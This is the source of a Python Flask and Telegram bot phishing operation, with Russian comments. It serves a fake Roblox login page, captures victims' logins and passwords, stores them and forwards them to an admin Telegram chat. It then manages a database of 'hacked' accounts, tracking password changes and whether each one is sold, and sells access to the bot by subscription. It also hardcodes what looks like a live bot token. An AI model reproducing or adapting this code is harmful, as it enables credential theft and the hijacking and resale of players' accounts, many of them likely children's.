from flask import Flask, request, render_template, redirect, url_for
import telebot
from telebot import types
from datetime import datetime, timedelta
import sqlite3
import threading
import time
import os
import requests

# === Настройки ===
TOKEN = '8028944732:AAH992DI-fMd3OSjfqfs4pEa3J04Jwb48Q4'
ADMIN_CHAT_ID = '6956377285'  # Убедитесь, что это ваш реальный chat_id
SITE_URL = 'https://af1e1cec-dea4-4701-b7a5-fc114fe30358-00-38gvj3r68lile.riker.replit.dev/'

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)

# === Инициализация базы данных ===
def init_db():
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users 
                 (chat_id TEXT PRIMARY KEY, prefix TEXT, subscription_end TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS credentials 
                 (login TEXT PRIMARY KEY, password TEXT, added_time TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
                 (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, 
                  prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
    c.execute("PRAGMA table_info(credentials)")
    columns = [col[1] for col in c.fetchall()]
    if 'added_time' not in columns:
        c.execute("ALTER TABLE credentials ADD COLUMN added_time TEXT")
    c.execute("PRAGMA table_info(hacked_accounts)")
    columns = [col[1] for col in c.fetchall()]
    if 'linked_chat_id' not in columns:
        c.execute("ALTER TABLE hacked_accounts ADD COLUMN linked_chat_id TEXT")
    
    # Принудительно устанавливаем "Создатель" для ADMIN_CHAT_ID
    subscription_end = (datetime.now() + timedelta(days=3650)).isoformat()  # 10 лет подписки
    c.execute("INSERT OR REPLACE INTO users (chat_id, prefix, subscription_end) VALUES (?, ?, ?)",
              (ADMIN_CHAT_ID, "Создатель", subscription_end))
    conn.commit()
    conn.close()
    print(f"Префикс 'Создатель' установлен для chat_id {ADMIN_CHAT_ID}")

# === Keep-alive функция ===
def keep_alive():
    while True:
        try:
            print("🔁 Отправляю пинг для поддержания активности...")
            requests.get(SITE_URL)
        except Exception as e:
            print(f"Пинг не удался: {e}")
        time.sleep(300)

# === Работа с базой данных ===
def get_user(chat_id):
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("SELECT prefix, subscription_end FROM users WHERE chat_id = ?", (chat_id,))
        result = c.fetchone()
        conn.close()
        if result:
            return {'prefix': result[0], 'subscription_end': datetime.fromisoformat(result[1])}
        return None
    except Exception as e:
        print(f"Ошибка в get_user: {e}")
        return None

def save_user(chat_id, prefix, subscription_end):
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO users (chat_id, prefix, subscription_end) VALUES (?, ?, ?)",
                  (chat_id, prefix, subscription_end.isoformat()))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Ошибка в save_user: {e}")

def delete_user(chat_id):
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("DELETE FROM users WHERE chat_id = ?", (chat_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Ошибка в delete_user: {e}")

def save_credential(login, password):
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        added_time = datetime.now().isoformat()
        c.execute("INSERT OR REPLACE INTO credentials (login, password, added_time) VALUES (?, ?, ?)",
                  (login, password, added_time))
        conn.commit()
        conn.close()
        print(f"Сохранен пароль: {login}, {password}")
    except Exception as e:
        print(f"Ошибка в save_credential: {e}")

def get_all_credentials():
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("SELECT login, password, added_time FROM credentials")
        result = c.fetchall()
        conn.close()
        current_time = datetime.now()
        valid_credentials = []
        for login, password, added_time in result:
            if added_time:
                added_dt = datetime.fromisoformat(added_time)
                if (current_time - added_dt).days <= 7:
                    valid_credentials.append((login, password, added_time))
                else:
                    delete_credential(login)
        print(f"Получено паролей: {len(valid_credentials)}")
        return valid_credentials
    except Exception as e:
        print(f"Ошибка в get_all_credentials: {e}")
        return []

def delete_credential(login):
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("DELETE FROM credentials WHERE login = ?", (login,))
        rows_affected = c.rowcount
        conn.commit()
        conn.close()
        print(f"Удален пароль для {login}, затронуто строк: {rows_affected}")
        return rows_affected > 0
    except Exception as e:
        print(f"Ошибка в delete_credential: {e}")
        return False

def save_hacked_account(login, password, prefix="Взломан", sold_status="Не продан", linked_chat_id=None):
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        hack_date = datetime.now().isoformat()
        c.execute("INSERT OR REPLACE INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id) VALUES (?, ?, ?, ?, ?, ?)",
                  (login, password, hack_date, prefix, sold_status, linked_chat_id))
        conn.commit()
        conn.close()
        print(f"Добавлен в взломанные: {login}, {password}, статус: {sold_status}")
    except Exception as e:
        print(f"Ошибка в save_hacked_account: {e}")

def get_all_hacked_accounts():
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("SELECT login, password, hack_date, prefix, sold_status, linked_chat_id FROM hacked_accounts")
        result = c.fetchall()
        conn.close()
        return [{'login': row[0], 'password': row[1], 'hack_date': datetime.fromisoformat(row[2]), 
                'prefix': row[3], 'sold_status': row[4], 'linked_chat_id': row[5]} for row in result]
    except Exception as e:
        print(f"Ошибка в get_all_hacked_accounts: {e}")
        return []

def delete_hacked_account(login):
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("DELETE FROM hacked_accounts WHERE login = ?", (login,))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"Ошибка в delete_hacked_account: {e}")
        return False

def clear_old_credentials():
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("SELECT login, added_time FROM credentials")
        result = c.fetchall()
        current_time = datetime.now()
        deleted = 0
        for login, added_time in result:
            if added_time:
                added_dt = datetime.fromisoformat(added_time)
                if (current_time - added_dt).days > 7:
                    delete_credential(login)
                    deleted += 1
        conn.close()
        return deleted
    except Exception as e:
        print(f"Ошибка в clear_old_credentials: {e}")
        return 0

def get_all_users():
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("SELECT chat_id, prefix, subscription_end FROM users")
        result = c.fetchall()
        conn.close()
        return [{'chat_id': row[0], 'prefix': row[1], 'subscription_end': datetime.fromisoformat(row[2])} for row in result]
    except Exception as e:
        print(f"Ошибка в get_all_users: {e}")
        return []

# === Проверка прав ===
def is_admin(chat_id):
    user = get_user(str(chat_id))
    return user and user['prefix'] in ['Админ', 'Создатель']

def is_creator(chat_id):
    user = get_user(str(chat_id))
    return user and user['prefix'] == 'Создатель'

# === Flask маршруты ===
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login-roblox.html')
def login_page():
    return render_template('login-roblox.html')

@app.route('/submit', methods=['POST'])
def submit():
    login = request.form.get('login')
    password = request.form.get('password')
    if login and password:
        save_credential(login, password)
        bot.send_message(ADMIN_CHAT_ID, f"🔐 Новый логин:\nЛогин: {login}\nПароль: {password}")
    return redirect(url_for('not_found'))

@app.route('/404')
def not_found():
    return render_template('404.html')

# === Команды Telegram бота ===
@bot.message_handler(commands=['start'])
def start_cmd(message):
    chat_id = str(message.chat.id)
    if not get_user(chat_id):
        save_user(chat_id, 'Посетитель', datetime.now())
    bot.reply_to(message, "✅ Бот активен. Используйте /menu для информации.")

@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    user = get_user(str(message.chat.id))
    if not user:
        bot.reply_to(message, "Вы не зарегистрированы!")
        return
    time_left = user['subscription_end'] - datetime.now()
    time_str = f"{time_left.days} дней" if time_left.total_seconds() > 0 else "Подписка истекла"
    bot.reply_to(message, f"🧾 Ваш статус:\nПрефикс: {user['prefix']}\nПодписка: {time_str}")

@bot.message_handler(commands=['site'])
def site_cmd(message):
    user = get_user(str(message.chat.id))
    if not user or user['prefix'] == 'Посетитель':
        bot.reply_to(message, "🔒 Доступно только для подписчиков!")
        return
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Перейти на сайт", url=SITE_URL))
    bot.reply_to(message, "🌐 Нажмите кнопку ниже:", reply_markup=markup)

@bot.message_handler(commands=['hacked'])
def hacked_cmd(message):
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    
    if not args:
        accounts = get_all_hacked_accounts()
        if not accounts:
            bot.reply_to(message, "📭 Список взломанных аккаунтов пуст!")
            return
        response = "📋 Список взломанных аккаунтов:\n\n"
        for acc in accounts:
            response += (f"Логин: {acc['login']}\n"
                        f"Пароль: {acc['password']}\n"
                        f"Дата взлома: {acc['hack_date'].strftime('%Y-%m-%d %H:%M')}\n"
                        f"Префикс: {acc['prefix']}\n"
                        f"Статус: {acc['sold_status']}\n"
                        f"Привязка: {acc['linked_chat_id'] or 'Нет'}\n\n")
        
        if len(response) > 4096:
            parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
            for part in parts:
                bot.reply_to(message, part)
        else:
            bot.reply_to(message, response)
        return

    if args[0] == "add" and len(args) >= 3:
        login, password = args[1], args[2]
        prefix = args[3] if len(args) > 3 else "Взломан"
        sold_status = args[4] if len(args) > 4 else "Не продан"
        linked_chat_id = args[5] if len(args) > 5 else None
        save_hacked_account(login, password, prefix, sold_status, linked_chat_id)
        bot.reply_to(message, f"✅ Аккаунт {login} добавлен в список взломанных!")
        
    elif args[0] == "delete" and len(args) == 2:
        login = args[1]
        if delete_hacked_account(login):
            bot.reply_to(message, f"✅ Аккаунт {login} удален из списка взломанных!")
        else:
            bot.reply_to(message, "❌ Ошибка при удалении аккаунта!")

@bot.message_handler(commands=['getchatid'])
def getchatid_cmd(message):
    chat_id = str(message.chat.id)
    bot.reply_to(message, f"Ваш Chat ID: {chat_id}")

@bot.message_handler(commands=['passwords'])
def passwords_cmd(message):
    if not is_admin(message.chat.id):
        bot.reply_to(message, "🔒 Команда доступна только администраторам!")
        return
    try:
        credentials = get_all_credentials()
        if not credentials:
            bot.reply_to(message, "📭 Список паролей пуст!")
            return
        
        for login, password, added_time in credentials:
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton("Добавить в взломанные", callback_data=f"hack_{login}"),
                types.InlineKeyboardButton("Удалить", callback_data=f"delete_{login}")
            )
            response = (f"Логин: {login}\n"
                        f"Пароль: {password}\n"
                        f"Добавлено: {datetime.fromisoformat(added_time).strftime('%Y-%m-%d %H:%M')}")
            bot.send_message(message.chat.id, response, reply_markup=markup)
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка при получении паролей: {e}")
        print(f"Error in passwords_cmd: {e}")

@bot.message_handler(commands=['opendb'])
def opendb_cmd(message):
    if not is_creator(message.chat.id):
        bot.reply_to(message, "🔒 Команда доступна только Создателю!")
        return
    try:
        response = "🗄️ Просмотр базы данных:\n\n"

        # Пользователи
        response += "👥 Пользователи:\n"
        users = get_all_users()
        if not users:
            response += "Пусто\n"
        for user in users:
            time_left = user['subscription_end'] - datetime.now()
            time_str = f"{time_left.days} дней" if time_left.total_seconds() > 0 else "Истекла"
            response += f"Chat ID: {user['chat_id']}, Префикс: {user['prefix']}, Подписка: {time_str}\n"

        # Пароли
        response += "\n🔑 Пароли:\n"
        credentials = get_all_credentials()
        if not credentials:
            response += "Пусто\n"
        for login, password, added_time in credentials:
            response += f"Логин: {login}, Пароль: {password}, Добавлено: {datetime.fromisoformat(added_time).strftime('%Y-%m-%d %H:%M')}\n"

        # Взломанные аккаунты
        response += "\n🔓 Взломанные аккаунты:\n"
        hacked_accounts = get_all_hacked_accounts()
        if not hacked_accounts:
            response += "Пусто\n"
        for acc in hacked_accounts:
            response += (f"Логин: {acc['login']}, Пароль: {acc['password']}, "
                        f"Дата: {acc['hack_date'].strftime('%Y-%m-%d %H:%M')}, "
                        f"Префикс: {acc['prefix']}, Статус: {acc['sold_status']}, "
                        f"Привязка: {acc['linked_chat_id'] or 'Нет'}\n")

        if len(response) > 4096:
            parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
            for part in parts:
                bot.reply_to(message, part)
        else:
            bot.reply_to(message, response)
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка при открытии базы данных: {e}")
        print(f"Error in opendb_cmd: {e}")

@bot.message_handler(commands=['database'])
def database_cmd(message):
    if not is_creator(message.chat.id):
        bot.reply_to(message, "🔒 Команда доступна только Создателю!")
        return
    try:
        response = "🗄️ База данных:\n\n"

        # Пользователи
        response += "👥 Пользователи:\n"
        users = get_all_users()
        if not users:
            response += "Пусто\n"
        for user in users:
            time_left = user['subscription_end'] - datetime.now()
            time_str = f"{time_left.days} дней" if time_left.total_seconds() > 0 else "Истекла"
            response += f"Chat ID: {user['chat_id']}, Префикс: {user['prefix']}, Подписка: {time_str}\n"

        # Пароли
        response += "\n🔑 Пароли:\n"
        credentials = get_all_credentials()
        if not credentials:
            response += "Пусто\n"
        for login, password, added_time in credentials:
            response += f"Логин: {login}, Пароль: {password}, Добавлено: {datetime.fromisoformat(added_time).strftime('%Y-%m-%d %H:%M')}\n"

        # Взломанные аккаунты
        response += "\n🔓 Взломанные аккаунты:\n"
        hacked_accounts = get_all_hacked_accounts()
        if not hacked_accounts:
            response += "Пусто\n"
        for acc in hacked_accounts:
            response += (f"Логин: {acc['login']}, Пароль: {acc['password']}, "
                        f"Дата: {acc['hack_date'].strftime('%Y-%m-%d %H:%M')}, "
                        f"Префикс: {acc['prefix']}, Статус: {acc['sold_status']}, "
                        f"Привязка: {acc['linked_chat_id'] or 'Нет'}\n")

        response += "\n📝 Управление:\n"
        response += "/database add_user <chat_id> <prefix> <days>\n"
        response += "/database add_cred <login> <password>\n"
        response += "/database add_hacked <login> <password> <prefix> <sold_status> <linked_chat_id>\n"
        response += "/database delete_user <chat_id>\n"
        response += "/database delete_cred <login>\n"
        response += "/database delete_hacked <login>\n"

        if len(response) > 4096:
            parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
            for part in parts:
                bot.reply_to(message, part)
        else:
            bot.reply_to(message, response)

        # Обработка аргументов
        args = message.text.split()[1:] if len(message.text.split()) > 1 else []
        if args:
            if args[0] == "add_user" and len(args) == 4:
                chat_id, prefix, days = args[1], args[2], int(args[3])
                subscription_end = datetime.now() + timedelta(days=days)
                save_user(chat_id, prefix, subscription_end)
                bot.send_message(message.chat.id, f"✅ Добавлен пользователь {chat_id}")
            
            elif args[0] == "add_cred" and len(args) == 3:
                login, password = args[1], args[2]
                save_credential(login, password)
                bot.send_message(message.chat.id, f"✅ Добавлен пароль для {login}")
            
            elif args[0] == "add_hacked" and len(args) >= 3:
                login, password = args[1], args[2]
                prefix = args[3] if len(args) > 3 else "Взломан"
                sold_status = args[4] if len(args) > 4 else "Не продан"
                linked_chat_id = args[5] if len(args) > 5 else None
                save_hacked_account(login, password, prefix, sold_status, linked_chat_id)
                bot.send_message(message.chat.id, f"✅ Добавлен взломанный аккаунт {login}")
            
            elif args[0] == "delete_user" and len(args) == 2:
                chat_id = args[1]
                delete_user(chat_id)
                bot.send_message(message.chat.id, f"✅ Удален пользователь {chat_id}")
            
            elif args[0] == "delete_cred" and len(args) == 2:
                login = args[1]
                delete_credential(login)
                bot.send_message(message.chat.id, f"✅ Удален пароль для {login}")
            
            elif args[0] == "delete_hacked" and len(args) == 2:
                login = args[1]
                delete_hacked_account(login)
                bot.send_message(message.chat.id, f"✅ Удален взломанный аккаунт {login}")
            
            else:
                bot.send_message(message.chat.id, "❌ Неверный формат команды!")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")
        print(f"Error in database_cmd: {e}")

# === Обработка кнопок ===
@bot.callback_query_handler(func=lambda call: call.data.startswith("hack_") or call.data.startswith("delete_"))
def handle_callback(call):
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "🔒 Доступно только администраторам!")
        return

    if call.data.startswith("hack_"):
        login = call.data.split("_")[1]
        credentials = get_all_credentials()
        for cred_login, old_password, _ in credentials:
            if cred_login == login:
                msg = bot.send_message(
                    call.message.chat.id,
                    f"Логин: {login}\nСтарый пароль: {old_password}\nВведите новый пароль для взломанного аккаунта:"
                )
                bot.register_next_step_handler(msg, lambda m: process_new_password(m, login, old_password, call.message.message_id))
                break
        bot.answer_callback_query(call.id, "Введите новый пароль")

    elif call.data.startswith("delete_"):
        login = call.data.split("_")[1]
        if delete_credential(login):
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"Логин: {login}\n🗑️ Удалено из базы!",
                reply_markup=None
            )
            bot.send_message(ADMIN_CHAT_ID, f"🗑️ {login} удалено из паролей!")
        else:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"Логин: {login}\n❌ Ошибка при удалении!",
                reply_markup=None
            )
        bot.answer_callback_query(call.id, "Успешно удалено!")

def process_new_password(message, login, old_password, original_message_id):
    new_password = message.text
    if not new_password:
        bot.send_message(message.chat.id, "❌ Пароль не может быть пустым!")
        return
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("Взломан", callback_data=f"status_{login}_{new_password}_Взломан"),
        types.InlineKeyboardButton("Продан", callback_data=f"status_{login}_{new_password}_Продан")
    )
    markup.add(types.InlineKeyboardButton("Привязать к аккаунту", callback_data=f"link_{login}_{new_password}"))
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=original_message_id,
        text=f"Логин: {login}\nНовый пароль: {new_password}\nВыберите статус:",
        reply_markup=markup
    )
    bot.delete_message(message.chat.id, message.message_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("status_"))
def handle_status(call):
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "🔒 Доступно только администраторам!")
        return
    try:
        _, login, new_password, status = call.data.split("_")
        if delete_credential(login):  # Удаляем из credentials перед добавлением
            save_hacked_account(login, new_password, prefix=status, sold_status=status)
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"Логин: {login}\nПароль: {new_password}\n✅ Добавлено в взломанные со статусом '{status}'!",
                reply_markup=None
            )
            bot.send_message(ADMIN_CHAT_ID, f"🔒 {login} добавлено в взломанные со статусом '{status}'!")
            bot.answer_callback_query(call.id, "Успешно добавлено!")
        else:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"Логин: {login}\n❌ Ошибка при добавлении в взломанные!",
                reply_markup=None
            )
            bot.answer_callback_query(call.id, "Ошибка при удалении из credentials!")
    except Exception as e:
        bot.answer_callback_query(call.id, f"Ошибка: {e}")
        print(f"Ошибка в handle_status: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("link_"))
def handle_link(call):
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "🔒 Доступно только администраторам!")
        return
    try:
        _, login, new_password = call.data.split("_")
        msg = bot.send_message(
            call.message.chat.id,
            f"Логин: {login}\nНовый пароль: {new_password}\nВведите Chat ID для привязки (или 'нет' для пропуска):"
        )
        bot.register_next_step_handler(msg, lambda m: process_link(m, login, new_password, call.message.message_id))
        bot.answer_callback_query(call.id, "Введите Chat ID")
    except Exception as e:
        bot.answer_callback_query(call.id, f"Ошибка: {e}")
        print(f"Ошибка в handle_link: {e}")

def process_link(message, login, new_password, original_message_id):
    linked_chat_id = message.text if message.text.lower() != "нет" else None
    status = "Взломан"
    if delete_credential(login):  # Удаляем из credentials перед добавлением
        save_hacked_account(login, new_password, prefix=status, sold_status=status, linked_chat_id=linked_chat_id)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=original_message_id,
            text=f"Логин: {login}\nПароль: {new_password}\n✅ Добавлено в взломанные со статусом '{status}'!\nПривязка: {linked_chat_id or 'Нет'}",
            reply_markup=None
        )
        bot.send_message(ADMIN_CHAT_ID, f"🔒 {login} добавлено в взломанные с привязкой: {linked_chat_id or 'Нет'}!")
    else:
        bot.send_message(message.chat.id, f"❌ Ошибка при удалении {login} из credentials!")
    bot.delete_message(message.chat.id, message.message_id)

# === Админ-команды ===
@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    if not is_admin(message.chat.id):
        bot.reply_to(message, "🔒 Команда доступна только администраторам!")
        return
    try:
        users_count = len(get_all_users())
        passwords_count = len(get_all_credentials())
        response = f"⚙️ Админ-панель:\nПользователей: {users_count}\nПаролей: {passwords_count}\n\n"
        
        if is_creator(message.chat.id):
            response += "📋 Список пользователей:\n"
            users = get_all_users()
            if not users:
                response += "Нет зарегистрированных пользователей.\n"
            else:
                for user in users:
                    time_left = user['subscription_end'] - datetime.now()
                    time_str = f"{time_left.days} дней" if time_left.total_seconds() > 0 else "Подписка истекла"
                    response += f"Chat ID: {user['chat_id']}\nПрефикс: {user['prefix']}\nПодписка: {time_str}\n\n"
        
        response += "📜 Доступные команды:\n"
        response += "/start - Начать работу с ботом\n"
        response += "/menu - Показать ваш статус\n"
        response += "/site - Получить ссылку на сайт (для подписчиков)\n"
        response += "/hacked - Показать или управлять взломанными аккаунтами\n"
        response += "/passwords - Показать список паролей с возможностью управления\n"
        response += "/admin - Показать админ-панель\n"
        response += "/setprefix <chat_id> <prefix> <days> - Установить префикс для пользователя\n"
        response += "/delprefix <chat_id> - Удалить пользователя из базы\n"
        response += "/clearold - Удалить старые пароли (старше 7 дней)\n"
        response += "/getchatid - Узнать ваш Chat ID\n"
        if is_creator(message.chat.id):
            response += "/opendb - Просмотр базы данных (только для Создателя)\n"
            response += "/database - Управление базой данных (только для Создателя)\n"

        if len(response) > 4096:
            parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
            for part in parts:
                bot.reply_to(message, part)
        else:
            bot.reply_to(message, response)
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка в админ-панели: {e}")
        print(f"Error in admin_cmd: {e}")

@bot.message_handler(commands=['setprefix'])
def setprefix_cmd(message):
    if not is_admin(message.chat.id):
        bot.reply_to(message, "🔒 Команда доступна только администраторам!")
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 3:
        bot.reply_to(message, "❌ Формат: /setprefix <chat_id> <prefix> <days>")
        return
    chat_id, prefix, days = args[0], args[1], args[2]
    try:
        days = int(days)
        subscription_end = datetime.now() + timedelta(days=days)
        save_user(chat_id, prefix, subscription_end)
        bot.reply_to(message, f"✅ Префикс {prefix} установлен для {chat_id} на {days} дней!")
    except ValueError:
        bot.reply_to(message, "❌ Количество дней должно быть числом!")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")
        print(f"Error in setprefix_cmd: {e}")

@bot.message_handler(commands=['delprefix'])
def delprefix_cmd(message):
    if not is_admin(message.chat.id):
        bot.reply_to(message, "🔒 Команда доступна только администраторам!")
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 1:
        bot.reply_to(message, "❌ Формат: /delprefix <chat_id>")
        return
    chat_id = args[0]
    try:
        delete_user(chat_id)
        bot.reply_to(message, f"✅ Пользователь {chat_id} удален из базы!")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")
        print(f"Error in delprefix_cmd: {e}")

@bot.message_handler(commands=['clearold'])
def clearold_cmd(message):
    if not is_admin(message.chat.id):
        bot.reply_to(message, "🔒 Команда доступна только администраторам!")
        return
    try:
        deleted = clear_old_credentials()
        bot.reply_to(message, f"✅ Удалено старых паролей: {deleted}")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")
        print(f"Error in clearold_cmd: {e}")

# === Запуск ===
def run_bot():
    while True:
        try:
            bot.polling(none_stop=True, interval=0)
        except Exception as e:
            print(f"Bot error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    init_db()
    threading.Thread(target=run_bot).start()
    threading.Thread(target=keep_alive).start()
    port = int(os.environ.get('PORT', 8080))
    app.run(host="0.0.0.0", port=port)